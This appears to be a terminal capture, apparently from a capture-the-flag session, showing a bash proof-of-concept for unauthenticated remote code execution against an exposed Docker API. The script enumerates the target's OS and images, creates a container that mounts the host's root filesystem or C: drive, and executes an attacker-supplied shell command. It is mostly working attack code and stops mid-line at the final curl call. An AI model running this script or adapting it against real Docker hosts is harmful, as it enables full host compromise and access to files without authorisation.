␀␀␀␀␀␀=== searching for flag ===
www-data@821fbd6a43fa:~/html/cacti$ #!/bin/bash

# Docker API Unauthenticated RCE PoC
# Description: Dynamically detects OS and available images to execute commands.

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' 

echo -e "${YELLOW}"
echo "#########################################################"
echo "#     Docker API Universal RCE & Audit Tool             #"
echo "#     Auto-detects OS & Images for Compatibility        #"
echo "#########################################################"
echo -e "${NC}"

if [ "$#" -lt 2 ]; then
    echo -e "${RED}[!] Usage: $0 <TARGET_IP> <COMMAND> [PORT]${NC}"
    echo -e "${BLUE}[i] Example: $0 192.168.1.10 'id'${NC}"
    exit 1
fi

TARGET_IP=$1
CMD=$2
TARGET_PORT=${3:-2375}
BASE_URL="http://$TARGET_IP:$TARGET_PORT"

echo -e "${BLUE}[*] Checking connection to $BASE_URL...${NC}"

INFO_RESPONSE=$(curl -s --connect-timeout 5 "$BASE_URL/info")

if [ -z "$INFO_RESPONSE" ]; then
    echo -e "${RED}[!] Connection failed. Target IP or port is closed.${NC}"
    exit 1
fi

OS_TYPE=$(echo "$INFO_RESPONSE" | grep -o '"OSType":"[^"]*"' | cut -d'"' -f4)

echo -e "${GREEN}[+] Detected OS Type: $OS_TYPE${NC}"

if [[ "$OS_TYPE" == "linux" ]]; then
    MOUNT_PATH="/:/host_root"
    echo -e "${BLUE}[i] Linux detected. Mounting host root (/).${NC}"
elif [[ "$OS_TYPE" == "windows" ]]; then
    MOUNT_PATH="/mnt/host/c:/host_root" 
    echo -e "${BLUE}[i] Windows detected. Attempting to mount C: drive.${NC}"
else
    MOUNT_PATH="/:/host_root"
    echo -e "${YELLOW}[!] OS Unknown. Defaulting to Linux mount path.${NC}"
fi

echo -e "${BLUE}[*] Enumerating available images...${NC}"

DETECTED_IMAGE=$(curl -s "$BASE_URL/images/json" | grep -o '"RepoTags":\["[^"]*"' | head -n 1 | sed 's/"RepoTags":\["//' | sed 's/"//')

if [ -z "$DETECTED_IMAGE" ] || [ "$DETECTED_IMAGE" == "null" ]; then
    echo -e "${YELLOW}[!] No existing images found or parsing failed.${NC}"
    echo -e "${YELLOW}[!] Attempting fallback to 'alpine:latest' (Requires Internet on target)${NC}"
    IMAGE="alpine:latest"
else
    IMAGE="$DETECTED_IMAGE"
    echo -e "${GREEN}[+] Target has image available: $IMAGE${NC}"
fi

CONTAINER_NAME="audit_$(date +%s)"

echo -e "${GREEN}[+] Creating container with image: $IMAGE${NC}"

CREATE_PAYLOAD="{
  \"Image\": \"$IMAGE\",
  \"Cmd\": [\"tail\", \"-f\", \"/dev/null\"],
  \"HostConfig\": {
    \"Binds\": [\"$MOUNT_PATH\"]
  }
}"

CREATE_RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" \
  -d "$CREATE_PAYLOAD" \
  "$BASE_URL/containers/create?name=$CONTAINER_NAME")

CONTAINER_ID=$(echo $CREATE_RESPONSE | grep -o '"Id":"[^"]*' | sed 's/"Id":"//')

if [ -z "$CONTAINER_ID" ] || [ "${#CONTAINER_ID}" -lt 12 ]; then
    echo -e "${RED}[!] Failed to create container.${NC}"
    echo -e "API Response: $CREATE_RESPONSE"
    exit 1
fi

echo -e "${GREEN}[+] Container ID: ${CONTAINER_ID:0:12}${NC}"

echo -e "${GREEN}[+] Starting container...${NC}"
curl -s -X POST "$BASE_URL/containers/$CONTAINER_ID/start" > /dev/null

echo -e "${GREEN}[+] Executing command: $CMD${NC}"
echo -e "${YELLOW}---------------- OUTPUT ----------------${NC}"

SAFE_CMD=$(echo "$CMD" | sed 's/"/\\"/g')

EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
  -d "{
    \"AttachStdout\": true,
    \"AttachStderr\": true,
    \"Tty\": false,
    \"Cmd\": [\"/bin/sh\", \"-c\", \"$SAFE_CMD\"]
  }" \
  "$BASE_URL/containers/$CONTAINER_ID/exec" | grep -o '"Id":"[^"]*' | sed 's/"Id":"//')

curl -s -X POST -H "Content-Type: application/json" \
